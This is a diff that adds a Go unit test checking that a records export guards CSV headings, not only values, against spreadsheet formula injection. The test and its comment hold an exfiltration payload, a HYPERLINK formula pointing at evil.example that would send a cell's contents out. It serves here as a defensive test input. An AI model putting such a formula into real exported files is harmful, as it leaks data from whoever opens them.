@@ -78,3 +78,29 @@ func TestWhatAnExportGuardsAnImportTakesBack(t *testing.T) {
 		}
 	}
 }
+
+// A heading is a cell too, and is guarded as one.
+//
+// A collection bound to no type takes a record with any field name, from
+// the command line, the browser, the content API or a model over MCP, and
+// the records export writes each name a record has as a heading. Every
+// value went through the guard and the headings did not, so a field named
+// =HYPERLINK("http://evil.example/?"&B2) was a formula in the file the
+// owner opened. A field name that is a word, which is every one a type can
+// declare, is written as it was.
+func TestTheHeadingsOfARecordsExportAreGuardedToo(t *testing.T) {
+	formula := `=HYPERLINK("http://evil.example/?"&B2)`
+	recs := []collection.Record{{ID: "a", Created: 1, Fields: map[string]any{"name": "Ada", formula: "x"}}}
+	rows, err := csv.NewReader(strings.NewReader(string(Write(nil, recs, WriteOptions{})))).ReadAll()
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got := strings.Join(rows[0], ","); got != "id,name,'"+formula {
+		t.Errorf("the headings were written as %q", got)
+	}
+	for _, h := range rows[0] {
+		if IsFormula(h) {
+			t.Errorf("the heading %q is a formula to a spreadsheet", h)
+		}
+	}
+}
